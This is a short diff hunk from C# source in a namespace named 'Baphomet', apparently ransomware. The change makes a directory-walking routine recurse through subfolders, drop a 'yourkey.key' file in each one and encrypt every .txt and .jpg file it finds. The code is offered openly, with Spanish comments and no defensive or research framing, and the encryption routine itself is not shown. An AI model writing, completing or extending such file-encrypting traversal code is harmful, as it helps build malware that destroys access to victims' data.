@@ -24,27 +24,29 @@ namespace Baphomet
         }
 
         //recoro los directorios
-        public void directoryRoad(string userdir, string key, string[] Dirs)
+        public void directoryRoad(string targetPath, string key)
         {
-            var extensionCheck = new[] { ".txt, .png" };//Extensiones validas
+            var extensionCheck = new[] { ".txt",".jpg" };//Extensiones validas
 
-            for (int d = 0; d < Dirs.Length; d++)//recoro cada uno de los dirs validos
+            File.WriteAllText(targetPath + "\\yourkey.key", key);//escribo la llave en cada uno de los directorios
+
+            string[] files = Directory.GetFiles(targetPath);
+            string[] subDirs = Directory.GetDirectories(targetPath);
+
+            for(int i = 0; i < files.Length; i++)
             {
-                var targetPath = userdir + Dirs[d];
-                File.WriteAllText(targetPath + "\\yourkey.key", key);//escribo la llave en cada uno de los directorios
-
-                string[] files = Directory.GetFiles(targetPath);
-               // string[] subDirs = Directory.GetDirectories(targetPath);
-
-                for(int i = 0; i < files.Length; i++)
+                var extension = Path.GetExtension(files[i]);
+                if (extensionCheck.Contains(extension))
                 {
-                    var extension = Path.GetExtension(files[i]);
-                    if (extensionCheck.Contains(extension))
-                    {
-                        encryptFileData(files[i], key, targetPath);
-                    }
+                    encryptFileData(files[i], key, targetPath);
                 }
-             }
+            }
+
+            for (int i = 0; i < subDirs.Length; i++)
+            {
+                directoryRoad(subDirs[i],key);
+            }
+
         }
 
          //archivo valido para cifrar bytes
